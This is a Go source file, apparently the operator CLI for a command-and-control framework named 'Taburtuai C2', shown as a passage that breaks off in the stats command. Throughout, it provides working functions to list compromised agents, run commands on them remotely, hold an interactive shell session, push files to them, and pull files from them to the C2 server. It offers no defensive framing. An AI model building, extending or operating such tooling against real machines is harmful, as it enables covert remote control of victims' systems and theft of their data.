package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/spf13/cobra"
)

// Color codes for terminal output
const (
	ColorReset  = "\033[0m"
	ColorRed    = "\033[31m"
	ColorGreen  = "\033[32m"
	ColorYellow = "\033[33m"
	ColorBlue   = "\033[34m"
	ColorPurple = "\033[35m"
	ColorCyan   = "\033[36m"
	ColorWhite  = "\033[37m"
)

// Global variables
var (
	config = &CLIConfig{
		ServerURL: os.Getenv("TABURTUAI_SERVER"),  // Default dari ENV
		APIKey:    os.Getenv("TABURTUAI_API_KEY"), // Default dari ENV
		Timeout:   30,                             // Default timeout
	}
	httpClient = &http.Client{Timeout: 60 * time.Second} // Timeout diperpanjang untuk operasi file
	verbose    bool
)

// CLIConfig holds configuration for the CLI
type CLIConfig struct {
	ServerURL string
	APIKey    string
	Timeout   int
}

// APIResponse represents standard API response
type APIResponse struct {
	Success bool        `json:"success"`
	Message string      `json:"message,omitempty"`
	Data    interface{} `json:"data,omitempty"`
	Error   string      `json:"error,omitempty"`
}

// Root command
var rootCmd = &cobra.Command{
	Use:   "taburtuai-cli",
	Short: "Taburtuai C2 Command Line Interface",
	Long: `Taburtuai C2 CLI - Enhanced Command & Control Interface
	
This CLI provides full control over the Taburtuai C2 server, allowing you to:
- Manage and monitor agents
- Execute commands remotely
- Transfer files
- View logs and statistics`,
	PersistentPreRun: func(cmd *cobra.Command, args []string) {
		// Ambil nilai dari flags jika diset, jika tidak, ENV atau default akan digunakan
		// Flags akan menimpa ENV jika keduanya diset.
		// Cobra menangani ini secara otomatis untuk PersistentFlags.
		if config.ServerURL == "" {
			// Jika setelah cobra parse flags masih kosong, berarti tidak diset via flag atau ENV
			// dan tidak ada default yang memuaskan di struct.
			// Namun, ServerURL memiliki default dari GetEnv di struct, jadi ini mungkin tidak akan terjadi
			// kecuali jika GetEnv mengembalikan string kosong dan flag tidak diset.
			// Kita tambahkan pemeriksaan eksplisit di sini untuk ServerURL.
			serverFlag, _ := cmd.Flags().GetString("server")
			if serverFlag != "" {
				config.ServerURL = serverFlag
			} else if os.Getenv("TABURTUAI_SERVER") != "" {
				config.ServerURL = os.Getenv("TABURTUAI_SERVER")
			} else {
				// Jika masih kosong, berikan default atau error
				// Default sudah diatur di cobra.Command.PersistentFlags() jika ada.
				// Kita pastikan ServerURL tidak kosong di sini.
				// Jika flag tidak ada defaultnya, kita set di sini.
				// Tapi karena kita sudah set default di PersistentFlags, ini lebih ke fallback.
				if config.ServerURL == "" { // Jika GetEnv return empty & flag tdk diset
					printError("TABURTUAI_SERVER environment variable or --server flag not set.")
					fmt.Println("Please set: export TABURTUAI_SERVER=http://your-server-url:port or use --server flag.")
					fmt.Println("Using default: http://localhost:8080")
					config.ServerURL = "http://localhost:8080" // Fallback jika semua gagal
				}
			}
		}
		// Perbarui timeout http client dari config.Timeout yang mungkin diubah oleh flag
		httpClient.Timeout = time.Duration(config.Timeout) * time.Second
	},
}

// --- SEMUA DEFINISI PERINTAH GLOBAL ADA DI SINI ---

// Agent commands
var agentsCmd = &cobra.Command{
	Use:   "agents",
	Short: "Manage agents",
	Long:  "List, view, and manage connected agents",
	// Tidak ada Run func, jadi akan tampil sebagai "topic" jika punya subcommands
}

var agentsListCmd = &cobra.Command{
	Use:   "list",
	Short: "List all agents",
	Run: func(cmd *cobra.Command, args []string) {
		printInfo("Fetching agent list...")

		body, err := makeAPIRequest("/api/v1/agents")
		if err != nil {
			printError(fmt.Sprintf("Failed to fetch agents: %v", err))
			os.Exit(1)
		}

		var response APIResponse
		if err := json.Unmarshal(body, &response); err != nil {
			printError("Failed to parse response")
			os.Exit(1)
		}

		if !response.Success {
			printError(fmt.Sprintf("Server error: %s", response.Error))
			os.Exit(1)
		}

		// Debug print untuk melihat struktur response
		if verbose {
			printVerbose(fmt.Sprintf("Full response data: %+v", response.Data))
		}

		data, ok := response.Data.(map[string]interface{})
		if !ok {
			printWarning("No data in response or invalid format.")
			return
		}

		// Cek apakah ada nested "result" structure
		var agentsInterface []interface{}

		// Try to get agents from nested structure first (server's current format)
		if result, hasResult := data["result"].(map[string]interface{}); hasResult {
			if agents, hasAgents := result["agents"].([]interface{}); hasAgents {
				agentsInterface = agents
				printVerbose("Found agents in nested result structure")
			}
		} else if agents, hasDirectAgents := data["agents"].([]interface{}); hasDirectAgents {
			// Fallback to direct agents structure
			agentsInterface = agents
			printVerbose("Found agents in direct structure")
		}

		if agentsInterface == nil {
			printWarning("No agent data found in response.")
			printVerbose(fmt.Sprintf("Available keys in data: %v", getMapKeys(data)))
			return
		}

		if len(agentsInterface) == 0 {
			printWarning("No agents found")
			return
		}

		printSuccess(fmt.Sprintf("Found %d agent(s)", len(agentsInterface)))
		fmt.Println()

		fmt.Printf("%s%-36s %-20s %-15s %-10s %-20s%s\n",
			ColorBlue, "AGENT ID", "HOSTNAME", "USERNAME", "STATUS", "LAST SEEN", ColorReset)
		fmt.Println(strings.Repeat("-", 100))

		for _, agent := range agentsInterface {
			a, ok := agent.(map[string]interface{})
			if !ok {
				continue
			}

			agentID := getStringFromMap(a, "id")
			if len(agentID) > 35 {
				agentID = agentID[:8] + "..."
			}

			hostname := getStringFromMap(a, "hostname")
			username := getStringFromMap(a, "username")
			status := getStringFromMap(a, "status")

			var statusColor string
			switch status {
			case "online":
				statusColor = ColorGreen
			case "offline":
				statusColor = ColorRed
			case "dormant":
				statusColor = ColorYellow
			default:
				statusColor = ColorWhite
			}

			lastSeen := "Unknown"
			if lastSeenStr := getStringFromMap(a, "last_seen"); lastSeenStr != "" {
				t, err := time.Parse(time.RFC3339, lastSeenStr)
				if err == nil {
					lastSeen = t.Format("2006-01-02 15:04:05")
				}
			}
			fmt.Printf("%-36s %-20s %-15s %s%-10s%s %-20s\n",
				agentID, hostname, username, statusColor, status, ColorReset, lastSeen)
		}
	},
}

func getMapKeys(m map[string]interface{}) []string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	return keys
}

var agentsInfoCmd = &cobra.Command{
	Use:   "info <agent-id>",
	Short: "Show detailed agent information",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID := args[0]
		printInfo(fmt.Sprintf("Fetching information for agent: %s", agentID))

		body, err := makeAPIRequest(fmt.Sprintf("/api/v1/agents/%s", agentID))
		if err != nil {
			printError(fmt.Sprintf("Failed to fetch agent info: %v", err))
			os.Exit(1)
		}

		var response APIResponse
		if err := json.Unmarshal(body, &response); err != nil {
			printError(fmt.Sprintf("Failed to parse agent info response: %v", err))
			os.Exit(1)
		}

		if !response.Success {
			printError(fmt.Sprintf("Error fetching agent info: %s", response.Error))
			os.Exit(1)
		}

		agent, ok := response.Data.(map[string]interface{})
		if !ok {
			printError("Invalid agent data format received.")
			os.Exit(1)
		}

		fmt.Printf("\n%sAgent Information:%s\n", ColorBlue, ColorReset)
		fmt.Println(strings.Repeat("=", 50))

		fmt.Printf("%sID:%s %s\n", ColorCyan, ColorReset, getStringFromMap(agent, "id"))
		fmt.Printf("%sHostname:%s %s\n", ColorCyan, ColorReset, getStringFromMap(agent, "hostname"))
		fmt.Printf("%sUsername:%s %s\n", ColorCyan, ColorReset, getStringFromMap(agent, "username"))
		fmt.Printf("%sOS:%s %s\n", ColorCyan, ColorReset, getStringFromMap(agent, "os"))
		fmt.Printf("%sArchitecture:%s %s\n", ColorCyan, ColorReset, getStringFromMap(agent, "architecture"))
		fmt.Printf("%sStatus:%s %s\n", ColorCyan, ColorReset, getStringFromMap(agent, "status"))
		if lastSeenStr := getStringFromMap(agent, "last_seen"); lastSeenStr != "" {
			t, _ := time.Parse(time.RFC3339, lastSeenStr)
			fmt.Printf("%sLast Seen:%s %s\n", ColorCyan, ColorReset, t.Format("2006-01-02 15:04:05"))
		}
		if firstContactStr := getStringFromMap(agent, "first_contact"); firstContactStr != "" {
			t, _ := time.Parse(time.RFC3339, firstContactStr)
			fmt.Printf("%sFirst Contact:%s %s\n", ColorCyan, ColorReset, t.Format("2006-01-02 15:04:05"))
		}
		fmt.Printf("%sCommands Executed:%s %.0f\n", ColorCyan, ColorReset, getFloatFromMap(agent, "commands_executed"))
		// Tambahkan field lain jika ada dari AgentHealth
		fmt.Println(strings.Repeat("=", 50))
	},
}

// Command execution command
var cmdCmd = &cobra.Command{
	Use:   "cmd <agent-id> <command>",
	Short: "Execute command on agent",
	Long:  "Execute a command on the specified agent and wait for results by default.",
	Args:  cobra.ExactArgs(2),
	Run: func(cmd *cobra.Command, args []string) {
		agentID := args[0]
		commandStr := args[1]

		timeout, _ := cmd.Flags().GetInt("timeout")
		workDir, _ := cmd.Flags().GetString("workdir")
		background, _ := cmd.Flags().GetBool("background")

		printInfo(fmt.Sprintf("Executing command on agent %s", agentID))
		printVerbose(fmt.Sprintf("Command: %s, Timeout: %ds, WorkDir: %s, Background: %v", commandStr, timeout, workDir, background))

		reqBody := map[string]interface{}{
			"agent_id": agentID,
			"command":  commandStr,
			"timeout":  timeout,
		}
		if workDir != "" {
			reqBody["working_dir"] = workDir
		}

		reqJSON, _ := json.Marshal(reqBody)
		serverRespBytes, err := makeAPIRequestWithMethod("POST", "/api/v1/command", bytes.NewBuffer(reqJSON), "application/json")
		if err != nil {
			printError(fmt.Sprintf("Failed to send command to server: %v", err))
			os.Exit(1)
		}

		if verbose {
			printVerbose(fmt.Sprintf("Command response: %s", string(serverRespBytes)))
		}

		var apiResp APIResponse
		if err := json.Unmarshal(serverRespBytes, &apiResp); err != nil {
			printError(fmt.Sprintf("Failed to parse server response for cmd: %v. Raw: %s", err, string(serverRespBytes)))
			os.Exit(1)
		}

		if !apiResp.Success {
			printError(fmt.Sprintf("Server error queuing command: %s", apiResp.Error))
			os.Exit(1)
		}

		// BAGIAN YANG DIGANTI - gunakan extractCommandID helper function
		commandID, err := extractCommandID(apiResp, "execute")
		if err != nil {
			printError(fmt.Sprintf("Failed to extract command_id: %v", err))
			os.Exit(1)
		}

		printSuccess(fmt.Sprintf("Command queued. Command ID: %s", commandID))

		if background {
			printInfo(fmt.Sprintf("Running in background. Check status with: taburtuai-cli status %s", commandID))
		} else {
			printInfo("Waiting for command execution to complete...")
			waitForCommand(commandID, timeout)
		}
	},
}

// Interactive shell command
var shellCmd = &cobra.Command{
	Use:   "shell <agent-id>",
	Short: "Start interactive shell session",
	Long:  "Start an interactive shell session with the specified agent.",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID := args[0]
		printInfo(fmt.Sprintf("Starting interactive shell with agent %s", agentID))
		printWarning("Type 'exit' or 'quit' or press Ctrl+D to quit.")
		fmt.Println()
		reader := bufio.NewReader(os.Stdin)

		for {
			fmt.Printf("%s[%s]$ %s", ColorGreen, agentID[:8], ColorReset)
			input, err := reader.ReadString('\n')
			if err != nil { // EOF (Ctrl+D) akan masuk sini
				fmt.Println("\nExiting shell session.")
				break
			}
			commandStr := strings.TrimSpace(input)
			if commandStr == "" {
				continue
			}
			if commandStr == "exit" || commandStr == "quit" {
				printInfo("Exiting shell session.")
				break
			}
			executeShellCommand(agentID, commandStr)
		}
	},
}

// Command status command
var statusCmd = &cobra.Command{
	Use:   "status <command-id>",
	Short: "Check command execution status",
	Long:  "Check the status of a previously executed command.",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		commandID := args[0]
		printInfo(fmt.Sprintf("Checking status for command: %s", commandID))

		body, err := makeAPIRequest(fmt.Sprintf("/api/v1/command/%s/status", commandID))
		if err != nil {
			printError(fmt.Sprintf("Failed to get command status: %v", err))
			os.Exit(1)
		}

		if verbose {
			printVerbose(fmt.Sprintf("Status response: %s", string(body)))
		}

		var response APIResponse
		if err := json.Unmarshal(body, &response); err != nil {
			printError(fmt.Sprintf("Failed to parse status response: %v. Raw: %s", err, string(body)))
			os.Exit(1)
		}

		if !response.Success {
			printError(fmt.Sprintf("Error getting command status: %s", response.Error))
			os.Exit(1)
		}

		if response.Data == nil {
			printError("No data found for this command status.")
			return
		}

		// Handle nested response structure
		var cmdData map[string]interface{}
		if dataMap, ok := response.Data.(map[string]interface{}); ok {
			// Check for nested result structure first
			if result, hasResult := dataMap["result"].(map[string]interface{}); hasResult {
				cmdData = result
				printVerbose("Found command status in nested result structure")
			} else {
				cmdData = dataMap
				printVerbose("Found command status in direct structure")
			}
		} else {
			printError("Invalid command data format for status.")
			return
		}

		displayFinalCommandStatus(cmdData, commandID)
	},
}

// History command
var historyCmd = &cobra.Command{
	Use:   "history <agent-id>",
	Short: "Show agent command history",
	Long:  "Display the command execution history for the specified agent.",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID := args[0]
		limit, _ := cmd.Flags().GetInt("limit")
		statusFilter, _ := cmd.Flags().GetString("status")

		printInfo(fmt.Sprintf("Fetching command history for agent: %s (limit %d)", agentID, limit))
		endpoint := fmt.Sprintf("/api/v1/agent/%s/commands?limit=%d", agentID, limit)
		if statusFilter != "" {
			endpoint += "&status=" + statusFilter
		}

		body, err := makeAPIRequest(endpoint)
		if err != nil {
			printError(fmt.Sprintf("Failed to get command history: %v", err))
			os.Exit(1)
		}

		if verbose {
			printVerbose(fmt.Sprintf("History response: %s", string(body)))
		}

		var response APIResponse
		if err := json.Unmarshal(body, &response); err != nil {
			printError(fmt.Sprintf("Failed to parse history response: %v. Raw: %s", err, string(body)))
			os.Exit(1)
		}

		if !response.Success {
			printError(fmt.Sprintf("Error getting history: %s", response.Error))
			os.Exit(1)
		}

		// Handle nested response structure
		var commandsInterface []interface{}
		if response.Data != nil {
			if dataMap, ok := response.Data.(map[string]interface{}); ok {
				// Check for nested result structure first
				if result, hasResult := dataMap["result"].(map[string]interface{}); hasResult {
					if commands, hasCommands := result["commands"].([]interface{}); hasCommands {
						commandsInterface = commands
						printVerbose("Found commands in nested result structure")
					}
				} else if commands, hasCommands := dataMap["commands"].([]interface{}); hasCommands {
					commandsInterface = commands
					printVerbose("Found commands in direct structure")
				}
			}
		}

		if commandsInterface == nil {
			printWarning("No command history data in response or invalid format.")
			if verbose && response.Data != nil {
				if dataMap, ok := response.Data.(map[string]interface{}); ok {
					printVerbose(fmt.Sprintf("Available keys in data: %v", getMapKeys(dataMap)))
				}
			}
			return
		}

		if len(commandsInterface) == 0 {
			printWarning("No command history found for this agent with current filters.")
			return
		}

		printSuccess(fmt.Sprintf("Found %d command(s) in history.", len(commandsInterface)))
		fmt.Println()
		fmt.Printf("%s%-12s %-20s %-10s %-8s %-30s%s\n",
			ColorBlue, "CMD ID", "TIMESTAMP", "STATUS", "EXIT", "COMMAND", ColorReset)
		fmt.Println(strings.Repeat("-", 90))

		for _, item := range commandsInterface {
			cmdMap, ok := item.(map[string]interface{})
			if !ok {
				continue
			}

			cmdID := getStringFromMap(cmdMap, "id")
			if len(cmdID) > 8 {
				cmdID = cmdID[:8] + "..."
			}

			timestamp := "N/A"
			if tsStr := getStringFromMap(cmdMap, "executed_at"); tsStr != "" {
				t, _ := time.Parse(time.RFC3339, tsStr)
				timestamp = t.Format("01-02 15:04:05")
			} else if tsStr := getStringFromMap(cmdMap, "created_at"); tsStr != "" {
				t, _ := time.Parse(time.RFC3339, tsStr)
				timestamp = t.Format("01-02 15:04:05") + " (Q)"
			}

			status := getStringFromMap(cmdMap, "status")
			var statusColor string
			switch status {
			case "completed":
				statusColor = ColorGreen
			case "failed", "timeout":
				statusColor = ColorRed
			case "executing":
				statusColor = ColorBlue
			case "pending":
				statusColor = ColorYellow
			default:
				statusColor = ColorWhite
			}

			exitCode := "-"
			if ecVal, ecOK := cmdMap["exit_code"]; ecOK {
				exitCode = fmt.Sprintf("%.0f", ecVal.(float64))
			}

			commandStr := getStringFromMap(cmdMap, "command")
			if len(commandStr) > 28 {
				commandStr = commandStr[:25] + "..."
			}

			fmt.Printf("%-12s %-20s %s%-10s%s %-8s %-30s\n",
				cmdID, timestamp, statusColor, status, ColorReset, exitCode, commandStr)
		}
		fmt.Println()
		printInfo("Use 'taburtuai-cli status <command-id>' for detailed information.")
	},
}

// Queue management command
var queueCmd = &cobra.Command{
	Use:   "queue",
	Short: "Manage command queues",
	Long:  "View and manage command queues for agents.",
}

var queueStatsCmd = &cobra.Command{
	Use:   "stats",
	Short: "Show queue statistics",
	Run: func(cmd *cobra.Command, args []string) {
		printInfo("Fetching queue statistics...")
		body, err := makeAPIRequest("/api/v1/queue/stats")
		if err != nil {
			printError(fmt.Sprintf("Failed to get queue stats: %v", err))
			os.Exit(1)
		}
		var response APIResponse
		if err := json.Unmarshal(body, &response); err != nil {
			printError(fmt.Sprintf("Failed to parse queue stats response: %v. Raw: %s", err, string(body)))
			os.Exit(1)
		}
		if !response.Success {
			printError(fmt.Sprintf("Error getting queue stats: %s", response.Error))
			os.Exit(1)
		}
		stats, ok := response.Data.(map[string]interface{})
		if !ok {
			printError("Invalid queue stats data format.")
			os.Exit(1)
		}

		fmt.Printf("\n%sQueue Statistics:%s\n", ColorBlue, ColorReset)
		fmt.Println(strings.Repeat("=", 50))
		fmt.Printf("%sTotal Queued:%s %.0f\n", ColorCyan, ColorReset, getFloatFromMap(stats, "total_queued"))
		fmt.Printf("%sTotal Active:%s %.0f\n", ColorCyan, ColorReset, getFloatFromMap(stats, "total_active"))
		fmt.Printf("%sTotal Completed (in memory):%s %.0f\n", ColorCyan, ColorReset, getFloatFromMap(stats, "total_completed"))

		if byAgent, ok := stats["by_agent"].(map[string]interface{}); ok && len(byAgent) > 0 {
			fmt.Printf("\n%sBy Agent:%s\n", ColorBlue, ColorReset)
			fmt.Println(strings.Repeat("-", 50))
			for agentID, agentStatsIf := range byAgent {
				as, ok := agentStatsIf.(map[string]interface{})
				if !ok {
					continue
				}
				fmt.Printf("  %s%s%s:\n", ColorYellow, agentID[:8], ColorReset)
				fmt.Printf("    Queued: %.0f, Active: %.0f, Completed (this agent): %.0f\n",
					getFloatFromMap(as, "queued"),
					getFloatFromMap(as, "active"),
					getFloatFromMap(as, "completed_for_agent"))
			}
		}
		fmt.Println()
	},
}

var queueClearCmd = &cobra.Command{
	Use:   "clear <agent-id>",
	Short: "Clear pending commands for an agent",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID := args[0]
		printWarning(fmt.Sprintf("Attempting to clear command queue for agent %s...", agentID))
		serverRespBytes, err := makeAPIRequestWithMethod("DELETE", "/api/v1/agent/"+agentID+"/queue", nil, "")
		if err != nil {
			printError(fmt.Sprintf("Failed to send clear queue request: %v", err))
			os.Exit(1)
		}
		var apiResp APIResponse
		if err := json.Unmarshal(serverRespBytes, &apiResp); err != nil {
			printError(fmt.Sprintf("Failed to parse clear queue response: %v. Raw: %s", err, string(serverRespBytes)))
			os.Exit(1)
		}
		if apiResp.Success {
			printSuccess(apiResp.Message)
		} else {
			printError(fmt.Sprintf("Error clearing queue: %s", apiResp.Error))
		}
	},
}

// Files command
var filesCmd = &cobra.Command{
	Use:   "files",
	Short: "File operations",
	Long:  "Upload, download, and manage files between CLI, C2 Server, and Agents.",
}

var filesUploadCmd = &cobra.Command{
	Use:   "upload <agent-id> <local-file> <remote-path>",
	Short: "Upload file from CLI to agent via C2 server",
	Long: `Uploads a local file to the specified agent at the given remote path.
The file is first sent to the C2 server, which then tasks the agent to store it.`,
	Args: cobra.ExactArgs(3),
	Run: func(cmd *cobra.Command, args []string) {
		agentID := args[0]
		localFilePath := args[1]
		remotePathOnAgent := args[2]
		wait, _ := cmd.Flags().GetBool("wait")

		printInfo(fmt.Sprintf("Preparing to upload '%s' to agent '%s' at '%s'", localFilePath, agentID, remotePathOnAgent))

		localFile, err := os.Open(localFilePath)
		if err != nil {
			printError(fmt.Sprintf("Failed to open local file '%s': %v", localFilePath, err))
			os.Exit(1)
		}
		defer localFile.Close()

		body := &bytes.Buffer{}
		writer := multipart.NewWriter(body)
		_ = writer.WriteField("destination_path", remotePathOnAgent)
		part, _ := writer.CreateFormFile("file", filepath.Base(localFilePath))
		_, _ = io.Copy(part, localFile)
		writer.Close()

		serverURL := fmt.Sprintf("%s/api/v1/agent/%s/upload", config.ServerURL, agentID)
		req, _ := http.NewRequest("POST", serverURL, body)
		req.Header.Set("Content-Type", writer.FormDataContentType())
		if config.APIKey != "" {
			req.Header.Set("Authorization", "Bearer "+config.APIKey)
		}

		printInfo(fmt.Sprintf("Uploading '%s' to C2 server for agent '%s'...", filepath.Base(localFilePath), agentID))
		resp, err := httpClient.Do(req)
		if err != nil {
			printError(fmt.Sprintf("Failed to send upload request to C2 server: %v", err))
			os.Exit(1)
		}
		defer resp.Body.Close()

		respBody, _ := io.ReadAll(resp.Body)

		if verbose {
			printVerbose(fmt.Sprintf("Upload response status: %d", resp.StatusCode))
			printVerbose(fmt.Sprintf("Upload response body: %s", string(respBody)))
		}

		if resp.StatusCode < 200 || resp.StatusCode >= 300 {
			printError(fmt.Sprintf("Upload request failed with status %d: %s", resp.StatusCode, string(respBody)))
			os.Exit(1)
		}

		var apiResp APIResponse
		if err := json.Unmarshal(respBody, &apiResp); err != nil {
			printError(fmt.Sprintf("Failed to parse upload response: %v. Raw: %s", err, string(respBody)))
			os.Exit(1)
		}

		if !apiResp.Success {
			printError(fmt.Sprintf("Server error during upload tasking: %s", apiResp.Error))
			os.Exit(1)
		}

		// Extract command_id using helper function
		commandID, err := extractCommandID(apiResp, "upload")
		if err != nil {
			printError(fmt.Sprintf("Failed to extract command_id from upload response: %v", err))
			os.Exit(1)
		}

		printSuccess(fmt.Sprintf("Upload command queued. Command ID: %s", commandID))

		if wait {
			printInfo("Waiting for upload to complete on agent...")
			finalStatusData := waitForCommand(commandID, 300) // Timeout 5 menit
			if finalStatusData != nil {
				if statusMap, ok := finalStatusData.(map[string]interface{}); ok {
					status := getStringFromMap(statusMap, "status")
					output := getStringFromMap(statusMap, "output")
					errorMsg := getStringFromMap(statusMap, "error")

					if status == "completed" {
						if output != "" {
							printSuccess(fmt.Sprintf("Upload completed: %s", output))
						} else {
							printSuccess(fmt.Sprintf("File '%s' uploaded successfully to '%s'", filepath.Base(localFilePath), remotePathOnAgent))
						}
					} else if status == "failed" {
						if errorMsg != "" {
							printError(fmt.Sprintf("Upload failed: %s", errorMsg))
						} else {
							printError(fmt.Sprintf("Failed to upload file '%s'", filepath.Base(localFilePath)))
						}
					}
				}
			}
		} else {
			printInfo(fmt.Sprintf("Check status with: taburtuai-cli status %s", commandID))
		}
	},
}

var filesDownloadCmd = &cobra.Command{
	Use:   "download <agent-id> <remote-file> <local-path>",
	Short: "Download file from agent to C2 server, save at specified server path",
	Long: `Tasks the agent to send a file to the C2 server. 
The C2 server will attempt to save this file to the 'local-path' provided (which is a path on the C2 server itself).
To get the file to your CLI machine, further steps might be needed if CLI and Server are separate.`,
	Args: cobra.ExactArgs(3),
	Run: func(cmd *cobra.Command, args []string) {
		agentID := args[0]
		remoteFileOnAgent := args[1]
		pathOnServerToSave := args[2]
		wait, _ := cmd.Flags().GetBool("wait")

		printInfo(fmt.Sprintf("Requesting download of '%s' from agent '%s'. Server will attempt to save to '%s'", remoteFileOnAgent, agentID, pathOnServerToSave))

		reqPayload := map[string]string{
			"source_path":      remoteFileOnAgent,
			"destination_path": pathOnServerToSave,
		}
		jsonPayload, err := json.Marshal(reqPayload)
		if err != nil {
			printError(fmt.Sprintf("Failed to marshal download request payload: %v", err))
			os.Exit(1)
		}

		endpoint := fmt.Sprintf("/api/v1/agent/%s/download", agentID)
		serverRespBytes, err := makeAPIRequestWithMethod("POST", endpoint, bytes.NewBuffer(jsonPayload), "application/json")
		if err != nil {
			printError(fmt.Sprintf("Failed to send download request to C2 server: %v", err))
			os.Exit(1)
		}

		if verbose {
			printVerbose(fmt.Sprintf("Download response: %s", string(serverRespBytes)))
		}

		var apiResp APIResponse
		if err := json.Unmarshal(serverRespBytes, &apiResp); err != nil {
			printError(fmt.Sprintf("Failed to parse download response: %v. Raw: %s", err, string(serverRespBytes)))
			os.Exit(1)
		}

		if !apiResp.Success {
			printError(fmt.Sprintf("Server error during download tasking: %s", apiResp.Error))
			os.Exit(1)
		}

		// Extract command_id using helper function
		commandID, err := extractCommandID(apiResp, "download")
		if err != nil {
			printError(fmt.Sprintf("Failed to extract command_id from download response: %v", err))
			os.Exit(1)
		}

		printSuccess(fmt.Sprintf("Download command queued. Command ID: %s", commandID))
		printInfo(fmt.Sprintf("The file will be sent from agent to C2 server and saved at/near '%s' on the server.", pathOnServerToSave))

		if wait {
			printInfo("Waiting for download to complete and be processed by server...")
			finalStatusData := waitForCommand(commandID, 600) // Timeout 10 menit
			if finalStatusData != nil {
				if statusMap, ok := finalStatusData.(map[string]interface{}); ok {
					status := getStringFromMap(statusMap, "status")
					output := getStringFromMap(statusMap, "output")
					errorMsg := getStringFromMap(statusMap, "error")

					if status == "completed" {
						if output != "" && strings.Contains(output, "File successfully downloaded from agent and saved to server") {
							printSuccess(output)
							printInfo("File is now on the C2 server. If CLI is on a different machine, retrieve it from the server manually or via a future 'get-staged-file' command.")
						} else if output != "" {
							printSuccess(fmt.Sprintf("Download completed: %s", output))
						} else {
							printSuccess(fmt.Sprintf("Download command %s completed. Check server path '%s'.", commandID, pathOnServerToSave))
						}
					} else if status == "failed" {
						if errorMsg != "" {
							printError(fmt.Sprintf("Download operation reported an error: %s", errorMsg))
						} else {
							printError(fmt.Sprintf("Failed to download file '%s'", remoteFileOnAgent))
						}
					}
				}
			}
		} else {
			printInfo(fmt.Sprintf("Check status with: taburtuai-cli status %s", commandID))
		}
	},
}

// Logs command
var logsCmd = &cobra.Command{
	Use:   "logs",
	Short: "Show server logs",
	Run: func(cmd *cobra.Command, args []string) {
		limit, _ := cmd.Flags().GetInt("limit")
		level, _ := cmd.Flags().GetString("level")
		category, _ := cmd.Flags().GetString("category")

		printInfo(fmt.Sprintf("Fetching last %d log entries...", limit))

		// Build query parameters
		queryParams := fmt.Sprintf("?count=%d", limit)
		if level != "" {
			queryParams += "&level=" + level
		}
		if category != "" {
			queryParams += "&category=" + category
		}

		endpoint := "/api/v1/logs" + queryParams
		if verbose {
			printVerbose(fmt.Sprintf("Requesting logs from: %s", endpoint))
		}

		body, err := makeAPIRequest(endpoint)
		if err != nil {
			printError(fmt.Sprintf("Failed to fetch logs: %v", err))
			os.Exit(1)
		}

		if verbose {
			printVerbose(fmt.Sprintf("Logs response: %s", string(body)))
		}

		var response APIResponse
		if err := json.Unmarshal(body, &response); err != nil {
			printError(fmt.Sprintf("Failed to parse logs response: %v. Raw: %s", err, string(body)))
			os.Exit(1)
		}

		if !response.Success {
			printError(fmt.Sprintf("Error fetching logs: %s", response.Error))
			os.Exit(1)
		}

		// Handle nested response structure for logs
		var logsInterface []interface{}
		if response.Data != nil {
			if dataMap, ok := response.Data.(map[string]interface{}); ok {
				// Check for nested result structure first
				if result, hasResult := dataMap["result"].(map[string]interface{}); hasResult {
					if logs, hasLogs := result["logs"].([]interface{}); hasLogs {
						logsInterface = logs
						printVerbose("Found logs in nested result structure")
					} else if entries, hasEntries := result["entries"].([]interface{}); hasEntries {
						logsInterface = entries
						printVerbose("Found log entries in nested result structure")
					}
				} else if logs, hasLogs := dataMap["logs"].([]interface{}); hasLogs {
					logsInterface = logs
					printVerbose("Found logs in direct structure")
				} else if entries, hasEntries := dataMap["entries"].([]interface{}); hasEntries {
					logsInterface = entries
					printVerbose("Found log entries in direct structure")
				}
			} else if directLogs, isArray := response.Data.([]interface{}); isArray {
				// Try direct array from response.Data
				logsInterface = directLogs
				printVerbose("Found logs as direct array from response.Data")
			}
		}

		if logsInterface == nil {
			printWarning("No log data found in response.")
			if verbose && response.Data != nil {
				if dataMap, ok := response.Data.(map[string]interface{}); ok {
					printVerbose(fmt.Sprintf("Available keys in response data: %v", getMapKeys(dataMap)))
				}
			}
			return
		}

		if len(logsInterface) == 0 {
			printWarning("No logs found.")
			return
		}

		printSuccess(fmt.Sprintf("Showing %d log entries:", len(logsInterface)))
		fmt.Println()

		for _, logEntry := range logsInterface {
			entry, ok := logEntry.(map[string]interface{})
			if !ok {
				continue
			}

			timestamp := getStringFromMap(entry, "timestamp")
			level := getStringFromMap(entry, "level")
			category := getStringFromMap(entry, "category")
			message := getStringFromMap(entry, "message")
			agentID := getStringFromMap(entry, "agent_id")

			var levelColor string
			switch level {
			case "INFO":
				levelColor = ColorBlue
			case "WARN":
				levelColor = ColorYellow
			case "ERROR", "CRITICAL":
				levelColor = ColorRed
			case "DEBUG":
				levelColor = ColorPurple
			default:
				levelColor = ColorWhite
			}

			logLine := fmt.Sprintf("%s[%s]%s [%s] [%s] %s",
				levelColor, level, ColorReset, timestamp, category, message)

			if agentID != "" {
				logLine += fmt.Sprintf(" (Agent: %s)", agentID[:min(len(agentID), 8)])
			}

			fmt.Println(logLine)
		}
	},
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// Stats command
var statsCmd = &cobra.Command{
	Use:   "stats",
	Short: "Show server statistics",
	Run: func(cmd *cobra.Command, args []string) {
		printInfo("Fetching server statistics...")
		body, err := makeAPIRequest("/api/v1/stats")
		if err != nil {
			printError(fmt.Sprintf("Failed to fetch stats: %v", err))
			os.Exit(1)
		}
		var response APIResponse
		if err := json.Unmarshal(body, &response); err != nil {
			printError(fmt.Sprintf("Failed to parse stats response: %v. Raw: %s", err, string(body)))
			os.Exit(1)
		}
		if !response.Success {
			printError(fmt.Sprintf("Error fetching stats: %s", response.Error))
			os.Exit(1)
		}
		stats, ok := response.Data.(map[string]interface{})
		if !ok {
			printError("Invalid stats data format.")
			os.Exit(1)
		}
		fmt.Printf("\n%sServer Statistics:%s\n", ColorBlue, ColorReset)
